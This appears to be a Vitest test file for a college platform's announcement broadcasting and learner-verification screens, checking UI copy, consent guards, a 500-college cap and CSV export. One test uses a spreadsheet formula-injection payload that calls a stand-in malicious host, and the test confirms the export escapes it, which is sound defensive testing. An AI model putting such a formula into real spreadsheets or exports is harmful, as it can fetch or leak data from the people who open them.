import { describe, expect, it } from "vitest";
import { readFileSync } from "node:fs";
import { verificationDecisionNotice } from "@/modules/verification/notification-copy";
import { verificationCsv } from "@/modules/verification/queue-export";
import { addBroadcastAudienceSelection, MAX_BROADCAST_RECIPIENT_COLLEGES } from "@/modules/announcements/super-admin-college-broadcast-model";

const read = (path: string) => readFileSync(path, "utf8");

describe("UX-G131 — announcement authoring, audience and confirmation", () => {
  it("supports keyboard submission with native required fields and guards publication consent", () => {
    const workspace = read("src/components/announcements/announcement-admin-workspace.tsx");
    expect(workspace).toContain('onSubmit={event=>{');
    expect(workspace).toContain('type="submit" disabled={pending || !title.trim()');
    expect(workspace).toContain('form="announcement-edit-form"');
    expect(workspace).toContain('(requiresPublicationConsent&&!editConsent)) return;');
    expect(workspace).toContain('<Input name="title" required');
    expect(workspace).toContain('<Textarea rows={6} name="message" required');
  });
  it("keeps selection scoped to offered colleges, reports search context and requires final consent", () => {
    const source = read("src/components/announcements/super-admin-college-broadcast-form.tsx");
    expect(source).toContain("matchingColleges.map(item=>item.id)");
    expect(source).toContain("Select matching (");
    expect(source).toContain("Clear selection");
    expect(source).toContain("Search only changes the visible choices");
    expect(source).toContain("reviewedCollegeIds:");
    expect(source).toContain("publishConsent:true");
    expect(source).toContain("confirmVariant=\"danger\"");
  });
});

describe("UX-G131 — recipient bulk-selection upper bound", () => {
  it("preserves earlier choices, deduplicates and never exceeds the server's exact 500-college cap", () => {
    const selected = Array.from({length: 499}, (_, i) => "college-" + i);
    const next = addBroadcastAudienceSelection(selected, ["college-0", "college-499", "college-500"]);
    expect(next).toHaveLength(MAX_BROADCAST_RECIPIENT_COLLEGES);
    expect(next).toContain("college-499");
    expect(next).not.toContain("college-500");
    expect(next.slice(0, 499)).toEqual(selected);
    expect(addBroadcastAudienceSelection([], ["one", "one", "two"])).toEqual(["one", "two"]);
    const form = read("src/components/announcements/super-admin-college-broadcast-form.tsx");
    expect(form).toContain("count<=MAX_BROADCAST_RECIPIENT_COLLEGES");
    expect(form).toContain("addBroadcastAudienceSelection(prev,matchingColleges.map(item=>item.id))");
  });
});

describe("UX-G162 — verification review control clarity", () => {
  it("describes page-only sorting, true selection size and the visible first-50 limit", () => {
    const source = read("src/components/verification/SuperAdminVerificationPanel.tsx");
    expect(source).toContain("Sort this page");
    expect(source).toContain("Math.min(20,candidates.length)");
    expect(source).toContain("candidates.length>50");
    expect(source).toContain("selected on this page");
    expect(source).toContain("collegeBulkReviewPayload");
    expect(source).toContain("skipped");
    // A new send-back batch cannot inherit a previously used rejection reason.
    expect(source).toContain('setReason("");setBulkAction("SEND_BACK");');
    expect(source).toContain("current.includes(key)||current.length>=20");
  });
  it("clears stale validation, supports TPO page-filter reset and retains guard checks", () => {
    const filters = read("src/components/verification/VerificationFilterPanel.tsx");
    const tpo = read("src/components/verification/TpoVerificationPanel.tsx");
    const review = read("src/components/verification/VerificationReviewDrawer.tsx");
    expect(filters).toContain('setError("");');
    expect(filters).toContain('verificationFilterDraftError');
    expect(tpo).toContain("Clear page filters");
    expect(tpo).toContain("defaultTpoVerificationFilters");
    expect(review).toContain("500 characters in the student-facing reason");
    expect(review).toContain("useGuardedAction");
    expect(review).toContain("canEditVerificationDecision");
  });
});

describe("UX-G183 — verified decisions and export copy", () => {
  it("separates the learner's reason from the corrective next step without duplicate punctuation", () => {
    expect(verificationDecisionNotice({
      section: "IDENTITY", action: "SENT_BACK", reviewerName: null, reason: "Incorrect ID",
    }).body).toBe("Incorrect ID. Fix it on your profile and send it again.");
    expect(verificationDecisionNotice({
      section: "IDENTITY", action: "SENT_BACK", reviewerName: null, reason: "Incorrect ID!",
    }).body).toBe("Incorrect ID! Fix it on your profile and send it again.");
    expect(verificationDecisionNotice({
      section: "EDUCATION", action: "SENT_BACK", reviewerName: null, reason: "   ",
    }).body).toBe("Your submitted details need a change. Fix it on your profile and send it again.");
  });
  it("includes the stored, authorized reviewer and CSV-escapes unsafe cells", () => {
    const service = read("src/modules/verification/staff-export-service.ts");
    expect(service).toContain("reviewedBy:profileVerifications.decidedByName");
    expect(service).toContain('reviewedBy:row.reviewedBy?.trim()||""');
    expect(service).toContain("eq(collegeMemberships.collegeId,scope.collegeId)");
    const csv = verificationCsv([{
      learnerName: "Learner", section: "EDUCATION", status: "VERIFIED",
      submittedAt: "7 Nov 2026", reviewedAt: "7 Nov 2026",
      reviewedBy: "=IMPORTDATA(\"https://malicious.example\")",
    }]).csv;
    expect(csv).toContain("Reviewed by");
    expect(csv).toContain("'=IMPORTDATA");
  });
});
